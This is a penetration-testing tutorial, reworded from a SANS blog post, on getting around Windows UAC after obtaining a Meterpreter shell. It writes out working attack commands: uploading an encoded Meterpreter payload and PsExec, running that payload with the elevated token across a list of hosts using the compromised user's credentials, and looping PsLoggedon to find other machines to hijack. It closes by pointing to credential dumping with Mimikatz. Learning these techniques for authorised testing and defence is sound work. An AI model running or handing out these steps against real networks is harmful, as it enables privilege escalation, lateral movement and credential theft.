# UAC Bypassing

### PsExec.exe method

For this example, lets just assume that you have gotten a meterpreter shell on a box. For the purposes of this demonstration, this box will be called Box0. Box0 is not a very kind soul though, and as thus although you have an admin shell on it, the UAC is preventing you from dumping the hashes of the system. You would like to upgrade this shell, but alas, the box is running Windows Vista with UAC, which is getting in the way of you escalating your privileges. Furthermore, the box appears to be patched and up to date, so you can't take advantage of any local OS or application exploits to gain privileges. So what can we do?

For starters we can turn to PsExec. PsExec will allow us to run commands against a remote machine, and comes with a handly little option, -h.

```bash
 -h   If the target system is Vista or higher, has the process
	  run with the account's elevated token, if available.
```

Seems handy for what were planning to do. Before we dive in though, I want to quickly note that the way UAC works for an admin user is that there is a normal token that is used for everyday activities and then there is a elevated privileges token that is used for special activities. This is why although we can't dump the hashes just yet, we have the normal admin token, but not the elevated one we need. Keep in mind that various boxes thoughtout the network may have either of these tokens, but only the elevated one will grant the privileges that we want, allowing us to do hash dumping and other fun stuff :)

Continuing on, the first step that we want to do is upload a copy of PsExec.exe and an encoded copy of a malicious meterepreter exe (see the Veil project for details on how to do this) up to the server. To do this, we could do:

```bash
upload *path to meterpreter exe* \\users\\*target user here*\\metpr.exe
upload *path to PsExec.exe* \\users\\*target user here*\\PsExec.exe
```

The next step to do is to gather a list of target IP addresses that you would like to try using your exploited user's authentication credentials against. Once you have done this, save it to a file (targets.txt in our example) and upload it to Box0. 

```bash
upload *path to targets.txt* \\users\\*target user here*\\targets.txt
```

We then can run PsExec.exe as follows:

```bash
PsExec.exe @targets.txt -accepteula -c -f -h -d metr.exe
```

I'll breifly explain the options. "-accepteula" sets the appropriate flag in the registry to make sure that the EULA agreement notification does not randomly pop up on the exploited user's machine. "-c" makes sure that we copy our meterpreter exe (metpr.exe) across to any system where the credentials work, whilst "-f" makes sure we overwrite the file if it already exists. "-h" is the important option here, which will run the meterpreter payload on any machine where the credentials works with the elevated token if the account on that machine has a elevated token attached to it (see PsExec output above). Finally, "-d" will make sure we don't wait for termination (run in background).

Now provided this command runs and we end up uploading and executing the meterpreter payload on a target in our targets.txt file that has admin rights, 2 things will happen. First off, we will not need to worry about credentials as if the user we are authenticating to on the remote machine is an admin (aka the user we compromised is admin on the remote machine), then the credentials for our compromized user will automatically be passed on to the remote machine, thus giving us access to the admin user on that machine without us needing to know the password. Secondly, if the user that we compromised is an admin on this machine, when the meterpreter exe executes, it will bypass the UAC, running instead as the priviledged admin user (it will use the elevated privileges token tied to that account). At this point, we now have a elevated shell on the second box, which we shall call Box1 for the rest of this document (this is after we do a getsystem on Box1 to elevate our privileges (which we can now do as we have the elevated privileges token we didn't have before)). 

We do have a slight problem though. Due to something called the double hop issue (http://support.microsoft.com/default.aspx?scid=kb;en-us;329986) we can't actually use the elevated privileges on Box1 to pass on the elevated privileges to Box0. This is because you can't pass resources more than 1 hop. In our example the first hop is from Box0 to Box1, and the second hop is Box1 to Box0. If we were to try doing this, we would end up trying to authenticate as the NTAUTHORITY\ANONYMOUS user as we would only have the secondary token to Box0, not the primary one (elevated privileges) that we need. The only way we could get around this is if we knew the password for the client on Box0, at which point we could then elevate privileges to the required level. To solve this problem we can use PsLoggedon.exe.


- - - - - -

### PsLoggedon.exe

- - - - - -

We now need to find another host where our user is running with a primary token so that we can escalate privileges on Box0. To do this, we will use PsLoggedon.exe from same PsTools suite that PsExec.exe comes from. Taking the targets.txt file that we created, here is the command to pass through the credentials of our currently compromized user and find out where else he/she is logged in:

```bash
for /F %i in (targets.txt) do @PsLoggedon.exe \\%i 2>NUL | find "*compromized user's name goes here*" >NUL && echo %i
```

This will list all of the boxes where our user is logged into. We can then target this box with the PsExec.exe method we used in the last example. Once we have a shell on the new host from that, we can then dump the credentials with Mimikatz if we want. This box will also have a primary key that we can then use to elevate our shell on Box0, thereby bypassing UAC.

- - - - - -
### Credits

All credits for the examples and explanation comes from Tim Medin's post which you can find here: http://pen-testing.sans.org/blog/pen-testing/2013/08/08/psexec-uac-bypass
The examples are all his work and I take no ownership for them. This article is mearly a rewording of what he has written in my own (tekwizz123's) words.

